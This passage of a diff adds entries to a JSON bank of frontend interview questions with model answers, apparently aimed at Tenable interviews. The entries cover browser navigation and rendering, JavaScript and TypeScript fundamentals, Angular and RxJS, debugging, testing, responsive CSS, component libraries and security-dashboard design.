JSON.stringify(event) }))\n    .catch((e) => console.warn('dropped', e))\n}\n\n// Talking points:\n// - Token bucket allows bursts up to capacity (good for spiky log streams).\n// - Leaky bucket (fixed rate, no bursts) is stricter — pick by use case.\n// - Always pair with server-side rate limiting; client-side is a politeness layer.\n// - For multi-tab apps, coordinate via BroadcastChannel or a SharedWorker so\n//   tabs don't each get their own quota.",
+    "order": 59
+  },
+  {
+    "id": "what-happens-when-typing-url",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "What happens when a user types a URL and sees the page?",
+    "difficulty": "medium",
+    "category": "DOM & Browser",
+    "description": "Describe the full browser-to-screen flow after a user enters a URL: URL parsing, DNS, TCP/TLS, HTTP, server response, browser parsing, rendering, JavaScript execution, and paint.",
+    "answerType": "text",
+    "tags": [
+      "browser",
+      "networking",
+      "DNS",
+      "HTTP",
+      "rendering",
+      "performance"
+    ],
+    "source": "Tenable interview",
+    "answer": "Interview framing:\nThe interviewer wants a clear end-to-end mental model. Start from the address bar, then move through networking, backend response, browser parsing, rendering, and follow-up loading.\n\nStep-by-step flow:\n1) User enters a URL:\n- The browser parses the input into scheme, host, port, path, query, and hash.\n- If no scheme is provided, it usually assumes https://.\n- It checks browser features like autocomplete, history, search fallback, HSTS, and service worker scope.\n\n2) Browser checks caches:\n- It may find a valid response in the HTTP cache, memory cache, disk cache, or service worker cache.\n- If cached content is fresh, the browser can skip some network work.\n- If stale, it may revalidate with headers like If-None-Match / ETag or If-Modified-Since.\n\n3) DNS lookup:\n- The browser needs the IP address for the domain.\n- It checks DNS caches: browser cache, OS cache, router/ISP cache, then recursive DNS.\n- The resolver walks from root servers to TLD servers to authoritative name servers if needed.\n- Result: an A/AAAA record mapping the domain to an IPv4/IPv6 address.\n\n4) Connection setup:\n- For HTTPS over HTTP/1.1 or HTTP/2, the browser opens a TCP connection to the server IP and port, usually 443.\n- TCP performs a three-way handshake: SYN, SYN-ACK, ACK.\n- TLS handshake follows: protocol negotiation, certificate validation, key exchange, and session keys.\n- For HTTP/3, this is usually QUIC over UDP, combining transport and TLS concepts.\n\n5) HTTP request:\n- The browser sends a request such as GET /path HTTP/2 with headers.\n- Headers include Host, User-Agent, Accept, Accept-Encoding, cookies, cache validators, and more.\n- Cookies for the domain/path are attached automatically, subject to SameSite/Secure rules.\n\n6) Server/CDN/proxy handling:\n- A CDN or reverse proxy may terminate TLS, serve cached content, compress assets, or route to an origin server.\n- The application server handles the request, reads data if needed, renders HTML or returns a static file/API response.\n- The server sends an HTTP response with status code, headers, and body.\n- Important headers can include Content-Type, Cache-Control, Set-Cookie, Content-Encoding, CSP, and redirects.\n\n7) Browser receives the response:\n- If the response is a redirect (301/302/307/308), the browser follows the Location header and repeats the relevant steps.\n- If it is compressed, the browser decompresses it.\n- If it is HTML, the browser starts parsing it incrementally as bytes arrive.\n\n8) HTML parsing and resource discovery:\n- The browser builds the DOM from HTML.\n- It discovers subresources like CSS, JavaScript, images, fonts, and preload links.\n- CSS files are fetched and parsed into the CSSOM.\n- Scripts can block parsing unless they use defer, async, module behavior, or are loaded later.\n\n9) JavaScript execution:\n- Blocking scripts execute during parsing and can read/change the DOM.\n- defer scripts run after HTML parsing, before DOMContentLoaded.\n- async scripts run as soon as they download, independent of parsing order.\n- JS may trigger more network requests, hydrate server-rendered markup, register event listeners, or mutate layout.\n\n10) Rendering pipeline:\n- Browser combines DOM + CSSOM into the render tree.\n- It calculates layout: size and position of visible elements.\n- It paints pixels for text, backgrounds, borders, shadows, and images.\n- It composites layers, often using the GPU, and presents the final frame on screen.\n\n11) Page lifecycle events:\n- DOMContentLoaded fires after HTML is parsed and deferred scripts have run.\n- load fires after dependent resources like images and stylesheets are loaded.\n- The user can often see and interact with part of the page before load, depending on streaming, CSS, JS, and rendering strategy.\n\n12) After first paint:\n- The browser continues fetching lazy resources, running JS, rendering animations, and responding to user input.\n- Performance is measured with metrics like TTFB, First Contentful Paint, Largest Contentful Paint, Interaction to Next Paint, and Cumulative Layout Shift.\n\nCommon follow-ups:\n- Q: What can make this slow?\n- A: Slow DNS, connection setup, TLS, backend TTFB, render-blocking CSS/JS, large bundles, unoptimized images, long main-thread tasks, and layout thrashing.\n- Q: Why is CSS render-blocking?\n- A: The browser needs CSS before it can safely paint styled content; otherwise users would see unstable flashes.\n- Q: How do defer and async differ?\n- A: defer preserves script order and runs after parsing; async runs whenever downloaded and can execute out of order.\n- Q: Where do service workers fit?\n- A: After navigation starts, a matching service worker can intercept the request and respond from cache, network, or generated content.",
+    "order": 60
+  },
+  {
+    "id": "tenable-javascript-fundamentals",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "JavaScript fundamentals checklist for frontend interviews",
+    "difficulty": "medium",
+    "category": "ES6+",
+    "description": "Walk through the JavaScript fundamentals a frontend engineer should know: scope, closures, hoisting, equality, `this`, prototypes, async behavior, modules, and common runtime pitfalls.",
+    "answerType": "text",
+    "tags": [
+      "JavaScript",
+      "fundamentals",
+      "closures",
+      "this",
+      "async"
+    ],
+    "source": "Tenable frontend prep",
+    "answer": "Interview framing:\nThis is usually a breadth question. Give a structured checklist and show that you can connect language rules to real bugs.\n\nCore topics:\n1) Scope and closures:\n- let/const are block-scoped; var is function-scoped.\n- A closure lets a function remember variables from its outer scope.\n- Common use cases: event handlers, memoization, debounce, private state.\n\n2) Hoisting and TDZ:\n- Function declarations are callable before their declaration.\n- var is hoisted and initialized to undefined.\n- let/const are hoisted but unavailable until initialized (temporal dead zone).\n\n3) Equality and coercion:\n- Prefer === because it avoids implicit coercion.\n- Know common surprises: [] == false, '0' == 0, null == undefined.\n\n4) this binding:\n- Determined by call site: default, implicit, explicit call/apply/bind, or new.\n- Arrow functions do not have their own this; they capture lexical this.\n\n5) Prototypes and classes:\n- Classes are syntax over prototype-based inheritance.\n- Property lookup walks the prototype chain.\n\n6) Async model:\n- Synchronous code runs first.\n- Promise callbacks run as microtasks.\n- Timers, events, and network callbacks are macrotasks.\n\n7) Common frontend pitfalls:\n- Mutating shared objects accidentally.\n- Missing return in promise chains.\n- Forgetting cleanup for timers/listeners.\n- Relying on stale closure values in callbacks.\n\nStrong closing sentence:\n\"I try to explain JS fundamentals by tying them to production bugs: stale state, wrong this, race conditions, memory leaks, and unexpected async ordering.\"",
+    "order": 61
+  },
+  {
+    "id": "tenable-typescript-frontend",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "TypeScript patterns for scalable frontend code",
+    "difficulty": "medium",
+    "category": "ES6+",
+    "description": "Explain how TypeScript improves frontend correctness and maintainability. Cover interfaces vs types, unions, generics, strict null checks, API typing, and component props.",
+    "answerType": "text",
+    "tags": [
+      "TypeScript",
+      "types",
+      "generics",
+      "frontend architecture"
+    ],
+    "source": "Tenable frontend job description",
+    "answer": "Interview framing:\nTypeScript is valuable when it models contracts between components, API responses, and business logic. The goal is not \"more types\"; it is fewer invalid states.\n\nKey points:\n1) type vs interface:\n- Use interface for object shapes that may be extended.\n- Use type for unions, intersections, primitives, tuples, and mapped types.\n\n2) Union types:\n- Model finite states explicitly:\n  loading | success | error is better than many optional booleans.\n\n3) Generics:\n- Useful for reusable helpers/components where input and output types are related.\n- Example: ApiResponse<T>, SelectOption<T>, Repository<T>.\n\n4) Strict null checks:\n- Force you to handle missing data from APIs and async flows.\n- Prefer narrowing over non-null assertions.\n\n5) API boundaries:\n- TypeScript checks compile-time assumptions, but API data is runtime input.\n- Use schema validation (zod/io-ts/custom validators) for untrusted responses.\n\n6) Component props:\n- Keep prop types expressive but small.\n- Avoid passing huge objects when a component only needs a few fields.\n\nPitfalls:\n- any disables the value of TypeScript.\n- Overly clever types can make code hard to maintain.\n- Types should encode domain invariants, not fight the implementation.",
+    "order": 62
+  },
+  {
+    "id": "tenable-angular-rxjs-change-detection",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Angular, RxJS, and change detection fundamentals",
+    "difficulty": "medium",
+    "category": "System Design",
+    "description": "Explain Angular frontend fundamentals: components, services, dependency injection, observables, RxJS operators, change detection, and common performance practices.",
+    "answerType": "text",
+    "tags": [
+      "Angular",
+      "RxJS",
+      "change detection",
+      "frontend architecture"
+    ],
+    "source": "Tenable frontend job description",
+    "answer": "Interview framing:\nTenable roles mention Angular heavily, so show that you understand Angular as an architecture: components for UI, services for shared logic/data, and RxJS for async streams.\n\nCore concepts:\n1) Components:\n- Own template, styles, inputs/outputs, and local UI behavior.\n- Prefer presentational components for reusable UI and container components for data orchestration.\n\n2) Services and DI:\n- Services hold shared data access, business logic, and integrations.\n- Dependency injection makes services testable and replaceable.\n\n3) Observables:\n- HTTP, route params, forms, and UI events can be modeled as streams.\n- Use async pipe where possible so Angular handles subscription cleanup.\n\n4) RxJS operators:\n- map transforms values.\n- switchMap cancels stale async work, great for search inputs.\n- mergeMap runs concurrent work.\n- concatMap preserves order.\n- catchError handles stream errors.\n\n5) Change detection:\n- Angular checks bindings when async events happen.\n- OnPush improves performance by checking components mainly when inputs change, events fire, or observables emit.\n\n6) Performance:\n- Use trackBy in ngFor.\n- Avoid expensive template functions.\n- Split large components.\n- Lazy-load feature modules/routes.\n\nCommon follow-up:\nQ: How do you prevent memory leaks?\nA: Prefer async pipe; otherwise unsubscribe with takeUntilDestroyed, takeUntil, or framework lifecycle helpers.",
+    "order": 63
+  },
+  {
+    "id": "tenable-debug-web-app-devtools",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Debug a broken web app with Chrome DevTools",
+    "difficulty": "medium",
+    "category": "DOM & Browser",
+    "description": "Describe a systematic debugging workflow for frontend issues using Chrome DevTools: Console, Network, Sources, Elements, Performance, Application, and React/Angular tooling.",
+    "answerType": "text",
+    "tags": [
+      "debugging",
+      "Chrome DevTools",
+      "browser",
+      "performance"
+    ],
+    "source": "Tenable UI job description",
+    "answer": "Interview framing:\nGood debugging is systematic. Start by reproducing the issue, then narrow it with browser evidence.\n\nWorkflow:\n1) Reproduce and scope:\n- What exact user action breaks?\n- Is it browser-specific, user-specific, data-specific, or environment-specific?\n\n2) Console:\n- Look for runtime errors, failed assertions, warnings, and stack traces.\n- Preserve logs across navigation if the issue happens during page load.\n\n3) Network:\n- Check failed requests, status codes, payloads, response bodies, CORS errors, caching, and timing.\n- Confirm whether the bug is frontend rendering or backend/API data.\n\n4) Elements:\n- Inspect DOM structure, computed CSS, layout, z-index, overflow, and event listeners.\n- Use forced states like :hover/:focus for UI bugs.\n\n5) Sources:\n- Add breakpoints, conditional breakpoints, and inspect call stacks.\n- Use source maps to debug TypeScript/React/Angular source.\n\n6) Performance:\n- Record slow interactions.\n- Look for long tasks, layout thrashing, expensive scripting, and repeated renders.\n\n7) Application:\n- Inspect cookies, localStorage, sessionStorage, IndexedDB, service workers, and cache.\n\nStrong closing:\n\"I try to prove where the bug lives: browser state, network/API, rendering/CSS, framework state, or business logic. Then the fix is usually much smaller.\"",
+    "order": 64
+  },
+  {
+    "id": "tenable-frontend-testing-strategy",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Frontend unit and end-to-end testing strategy",
+    "difficulty": "medium",
+    "category": "System Design",
+    "description": "Design a practical testing strategy for a production frontend app. Cover unit tests, component tests, integration tests, E2E tests, mocks, accessibility checks, and CI trade-offs.",
+    "answerType": "text",
+    "tags": [
+      "testing",
+      "unit tests",
+      "E2E",
+      "CI",
+      "quality"
+    ],
+    "source": "Tenable frontend job description",
+    "answer": "Interview framing:\nTesting should protect important behavior without making refactors painful. The pyramid is useful, but product risk matters more than dogma.\n\nTesting layers:\n1) Unit tests:\n- Pure functions, reducers, validators, formatters, permissions, and state transitions.\n- Fast and stable.\n\n2) Component tests:\n- Render a component and interact with it like a user.\n- Assert visible behavior, not implementation details.\n\n3) Integration tests:\n- Verify components, routing, API clients, and state management work together.\n- Mock network at the boundary.\n\n4) End-to-end tests:\n- Cover critical user journeys: login, search, save, dashboard workflows.\n- Fewer tests, high confidence, run in CI and before releases.\n\n5) Accessibility:\n- Add automated checks for labels, roles, contrast, keyboard flow where possible.\n- Manually test important keyboard interactions.\n\nMocking strategy:\n- Mock unstable external services.\n- Prefer realistic fixtures and MSW-style request mocks over mocking every function.\n\nWhat not to over-test:\n- CSS implementation details.\n- Framework internals.\n- Snapshots that change often and catch little.\n\nGood answer:\n\"I want many cheap tests around logic, focused component tests around UI behavior, and a small number of E2E tests around business-critical flows.\"",
+    "order": 65
+  },
+  {
+    "id": "tenable-api-data-loading-states",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Handle API data flow, loading, errors, and stale requests",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Explain how to build reliable frontend API flows: loading states, errors, retries, cancellation, stale response guards, caching, pagination, and optimistic updates.",
+    "answerType": "mixed",
+    "tags": [
+      "API",
+      "async",
+      "loading states",
+      "race conditions",
+      "caching"
+    ],
+    "source": "Tenable frontend job description",
+    "answer": "Interview framing:\nFrontend API code is about user experience and correctness. The hard parts are not fetch itself; they are state, races, retries, and stale data.\n\nState model:\n- idle: request not started\n- loading: request in flight\n- success: data available\n- error: request failed with recoverable message\n- refreshing: old data visible while new data loads\n\nRace condition example:\n```ts\nlet latestRequest = 0\n\nasync function loadUser(id: string) {\n  const requestId = ++latestRequest\n  setState({ status: 'loading' })\n\n  try {\n    const data = await api.getUser(id)\n    if (requestId !== latestRequest) return\n    setState({ status: 'success', data })\n  } catch (error) {\n    if (requestId !== latestRequest) return\n    setState({ status: 'error', error })\n  }\n}\n```\n\nBest practices:\n- Use AbortController to cancel stale fetches.\n- Show useful empty/error states, not only spinners.\n- Retry only safe/idempotent operations, ideally with backoff.\n- Cache data with a clear invalidation strategy.\n- Keep old data visible during refresh when possible.\n- Use pagination or virtualization for large result sets.\n- For optimistic updates, have rollback behavior on failure.\n\nSecurity and correctness:\n- Never trust API data blindly.\n- Validate important shapes at boundaries.\n- Handle 401/403 distinctly from 500/network failures.",
+    "order": 66
+  },
+  {
+    "id": "tenable-responsive-css-layout",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Build responsive layouts with CSS, Flexbox, and Grid",
+    "difficulty": "easy",
+    "category": "DOM & Browser",
+    "description": "Explain how to build maintainable responsive UI: semantic HTML, Flexbox vs Grid, media/container queries, fluid sizing, accessibility, and common layout bugs.",
+    "answerType": "text",
+    "tags": [
+      "CSS",
+      "responsive design",
+      "Flexbox",
+      "Grid",
+      "accessibility"
+    ],
+    "source": "Tenable frontend job description",
+    "answer": "Interview framing:\nResponsive CSS is about content adapting cleanly across screen sizes, not just adding media queries.\n\nCore points:\n1) Start with semantic HTML:\n- Good structure helps accessibility, keyboard navigation, and styling.\n\n2) Flexbox vs Grid:\n- Flexbox is best for one-dimensional layout: row or column.\n- Grid is best for two-dimensional layout: rows and columns together.\n\n3) Responsive sizing:\n- Use relative units where appropriate: %, rem, em, vw/vh, min(), max(), clamp().\n- Avoid fixed pixel widths for containers that need to shrink.\n\n4) Breakpoints:\n- Use content-based breakpoints, not only device names.\n- Container queries can be better when a component depends on parent width.\n\n5) Common bugs:\n- overflow hidden clipping dropdowns/tooltips.\n- long text breaking cards.\n- missing min-width: 0 in flex children.\n- images without max-width: 100%.\n- z-index issues caused by stacking contexts.\n\n6) Accessibility:\n- Preserve focus outlines.\n- Ensure sufficient contrast.\n- Keep tap targets large enough.\n- Test with keyboard and zoom.\n\nGood closing:\n\"I prefer building components that are fluid by default and only adding breakpoints when the content actually needs a layout change.\"",
+    "order": 67
+  },
+  {
+    "id": "tenable-component-library-architecture",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Design reusable components and a frontend component library",
+    "difficulty": "hard",
+    "category": "System Design",
+    "description": "Design a reusable component system for a large SaaS product. Cover API design, composition, theming, accessibility, testing, versioning, documentation, and avoiding over-abstraction.",
+    "answerType": "text",
+    "tags": [
+      "component library",
+      "design system",
+      "architecture",
+      "accessibility"
+    ],
+    "source": "Tenable frontend job description",
+    "answer": "Interview framing:\nA component library should make product teams faster while keeping UX consistent. The hard part is designing APIs that are flexible without becoming vague.\n\nDesign principles:\n1) Start from real product use cases:\n- Extract components after repeated patterns appear.\n- Avoid abstracting one-off UI too early.\n\n2) Separate primitives and product components:\n- Primitives: Button, Input, Modal, Tooltip, Table.\n- Product components: VulnerabilityCard, RiskBadge, AssetSelector.\n\n3) Component APIs:\n- Prefer composition for complex components.\n- Keep props predictable and typed.\n- Avoid boolean prop explosions like primary + danger + outlined + compact.\n\n4) Accessibility:\n- Keyboard behavior, focus management, ARIA, labels, and screen reader behavior are part of the component contract.\n\n5) Theming:\n- Use design tokens for color, spacing, typography, radius, shadows.\n- Support dark mode/high contrast if required.\n\n6) Testing and documentation:\n- Unit/component tests for behavior.\n- Visual regression for design-sensitive components.\n- Storybook or equivalent docs with examples and edge cases.\n\n7) Versioning:\n- Communicate breaking changes.\n- Provide migration notes or codemods for large changes.\n\nPitfalls:\n- Too much configurability makes components hard to reason about.\n- Too little flexibility causes teams to fork or bypass the library.\n- Accessibility cannot be patched at the end.",
+    "order": 68
+  },
+  {
+    "id": "tenable-browser-compatibility-quirks",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Handle browser compatibility and frontend quirks",
+    "difficulty": "medium",
+    "category": "DOM & Browser",
+    "description": "Explain how to diagnose and fix browser-specific frontend issues across rendering, JavaScript APIs, CSS support, polyfills, transpilation, and progressive enhancement.",
+    "answerType": "text",
+    "tags": [
+      "browser compatibility",
+      "polyfills",
+      "CSS",
+      "debugging"
+    ],
+    "source": "Tenable UI job description",
+    "answer": "Interview framing:\nBrowser compatibility is a production discipline: know supported browsers, test them, and degrade gracefully when features are missing.\n\nApproach:\n1) Define support matrix:\n- Which browsers and versions matter for customers?\n- Enterprise SaaS products may need stricter support than consumer apps.\n\n2) Detect the class of issue:\n- CSS rendering difference.\n- Missing JS/Web API.\n- Event behavior difference.\n- Performance issue on specific hardware/browser.\n- Mobile viewport/input quirk.\n\n3) Use compatibility tools:\n- BrowserStack/Sauce Labs or real devices.\n- MDN/caniuse for feature support.\n- DevTools device emulation only as a first pass.\n\n4) Polyfills and transpilation:\n- Babel/TypeScript can transpile syntax.\n- Polyfills are needed for missing runtime APIs.\n- Load only what you need to avoid bundle bloat.\n\n5) Progressive enhancement:\n- Use feature detection instead of browser sniffing when possible.\n- Provide fallback UI/behavior for unsupported features.\n\nCommon examples:\n- CSS gap support in older flexbox implementations.\n- position: sticky failures inside overflow containers.\n- mobile viewport height issues with browser chrome.\n- date/input behavior differences.\n- passive event listener and scroll performance differences.\n\nGood closing:\n\"I try to fix compatibility with standards-based feature detection and small fallbacks, not browser-specific hacks unless there is no better option.\"",
+    "order": 69
+  },
+  {
+    "id": "tenable-data-visualization-dashboard",
+    "companies": [
+      "Tenable"
+    ],
+    "title": "Design frontend data visualization for a security dashboard",
+    "difficulty": "hard",
+    "category": "System Design",
+    "description": "Design a frontend dashboard that visualizes vulnerability or attack-path data with charts, tables, filters, drilldowns, and performance constraints.",
+    "answerType": "text",
+    "tags": [
+      "data visualization",
+      "dashboard",
+      "performance",
+      "security SaaS"
+    ],
+    "source": "Tenable frontend job description",
+    "answer": "Interview framing:\nFor Tenable-style products, visualization is not decoration. It helps users prioritize security risk and make decisions from complex data.\n\nDesign approach:\n1) Clarify the user goal:\n- Are users finding critical vulnerabilities, understanding trends, exploring attack paths, or reporting status?\n\n2) Choose the right visualization:\n- Table for precise comparison and workflows.\n- Line/bar charts for trends and counts.\n- Graph visualization for relationships and attack paths.\n- Heatmaps for density or severity distribution.\n\n3) Data pipeline:\n- Fetch summarized data for overview.\n- Fetch details lazily on drilldown.\n- Keep filters encoded in URL for shareable state.\n- Debounce expensive filter/search actions.\n\n4) Performance:\n- Virtualize large tables.\n- Aggregate server-side when datasets are large.\n- Memoize expensive transformations.\n- Use Web Workers for heavy layout/graph calculations.\n- Avoid rendering thousands of SVG nodes if canvas/WebGL is more appropriate.\n\n5) UX:\n- Show loading, empty, and error states.\n- Make severity/risk color palettes accessible.\n- Add legends, tooltips, and clear units.\n- Preserve user context when filters change.\n\n6) Security/product concerns:\n- Avoid leaking sensitive asset names in logs.\n- Respect RBAC in every API response, not only hidden UI controls.\n- Make export/share flows permission-aware.\n\nGood follow-up:\n\"I would validate the dashboard with realistic data volume, because visualization choices that work for 100 nodes often fail at 50,000.\"",
+    "order": 70
+  }
+]
